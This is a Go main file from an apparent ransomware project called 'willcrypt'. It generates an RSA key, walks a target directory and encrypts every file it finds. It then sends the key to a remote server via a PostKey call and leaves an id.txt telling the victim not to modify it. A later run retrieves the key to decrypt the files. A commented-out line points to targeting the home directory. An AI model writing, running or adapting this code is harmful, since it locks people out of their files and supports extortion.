package main

import (
	"crypto/rsa"
	"sync"

	"fmt"
	"io"
	"os"
	"strings"

	"github.com/spf13/pflag"
	"github.com/sywc670/willcrypt/internal/utils"
	"github.com/sywc670/willcrypt/pkg/wcrypt"
)

var Debug bool
var TargetDir string

func init() {
	pflag.StringVarP(&TargetDir, "dir", "d", ".", "default '.'")
	pflag.BoolVarP(&Debug, "debug", "v", false, "default false")
}

func main() {
	pflag.Parse()
	var shouldEncrypt bool
	var priv *rsa.PrivateKey
	var wg sync.WaitGroup

	idFile, err := os.Open("id.txt")

	if err == nil {
		content, err := io.ReadAll(idFile)
		idFile.Close()

		if err != nil {
			panic(err)
		}

		id := strings.Split(string(content), "\r\n")[1]

		debugf("id: %s\n", id)

		priv = utils.GetKey(id)
	} else {
		fmt.Println("Generating PrivateKey")
		priv = utils.GenerateKey()
		shouldEncrypt = true
	}

	fmt.Println()
	fmt.Println(utils.Stringify(priv))

	// startDir := utils.GetHomeDir()
	startDir := TargetDir

	encryptionOrDecryption := func(filepath string, isEncrypted bool) {
		if isEncrypted {
			debug(filepath, "use decryption")
			wcrypt.Decrypt(filepath, priv)
		} else {
			debug(filepath, "use encryption")
			wcrypt.Encrypt(filepath, priv)
		}
	}

	wg.Add(1)
	debug("Start Walk")
	go walk(startDir, &wg, encryptionOrDecryption)

	if shouldEncrypt {
		id := utils.GenerateID()

		debugf("id: %s\n", id)
		debugf("private key: %s\n", utils.Stringify(priv))

		err := utils.PostKey(priv, id)
		if err != nil {
			panic(err)
		}

		data := "# Do not modify this file, it contains your ID matching the encryption key\r\n" + id

		os.WriteFile("id.txt", []byte(data), 0777)
	}
	wg.Wait()
	debug("Done...")
}
